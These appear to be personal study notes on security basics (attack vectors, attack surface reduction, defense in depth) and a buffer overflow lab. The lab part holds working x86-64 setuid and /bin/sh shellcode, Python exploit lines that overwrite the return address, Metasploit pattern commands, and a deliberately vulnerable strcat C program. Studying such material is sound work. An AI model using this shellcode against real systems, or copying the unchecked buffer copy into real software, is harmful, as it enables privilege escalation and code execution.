# Theory

## Definitions
- **Attack Vector**: tool, technique method USED to attack
  - weapons, phishing, DOS, Web drive-by, Flaws in browser, unpached vulnerability
- **Attack Surface**: surface area of the victim that ca be impacted
  - unarmoured body, email server, internet-facebing web, end-user machine, humans
- **Attack Surface Reduction**: 
  - Closing unused ports
  - strong password policy
  - lock out after X attempts
  - No sensitive information in public repositories
  - phishing protection
  - Disable macros
  - [Microsoft Attack surface reduction (ASR) rules reference](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
  - patch software

## Defense in Depth
- Severel layers of defense
- secure everything on the way
- Levels
  - Perimeter
    - WAF, FIrewalls, DMZ
  - layers
   - apllication of sensors, analytics, alerting,
   - first level defense, network segmentation, zeto trust, least privileged access
  - response
    - Detection, log collection, analytics

## Buffer Overflow
- Write more than the capacity of the memory
- Generating cyclic patterns
  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
- Method 1
  - Generate payload with metasploit
  - identify the value in the register (gdb i r)
  - compare patter offser
    - /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l # -q memory

- Method 2
  - Override EIP
  - Total to Override - EIP-Space
- Debugger - Reverse Engineering
  - gdb debugger
    - set exec-wrapper env -u LINES -u COLUMNS
    - run
      - Input - Buffer = Overflow
    - Find addresses:
      - disassemble [Funcion_Name]
    - Examine the dump hex code
      - x/100x $rsp-200
    - Show all registers
      - i r
  - [r2](https://github.com/radareorg/radare2)

- NOP instruction
  - no operation instruction = does nothing = \x90
  - python -c "print 'NOP'*no_of_nops + 'shellcode' + 'random_data'*no_of_random_data + 'memory address'"



```
Shellcode = 40 = \x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05

SETUID: \x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05


run $(python -c "print '\x90'*100 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*40 + 'B'*6")



run $(python -c "print '\x90'*100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*9 + '\x70\xe2\xff\xff\xff\x7f'")



0x



void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}




```




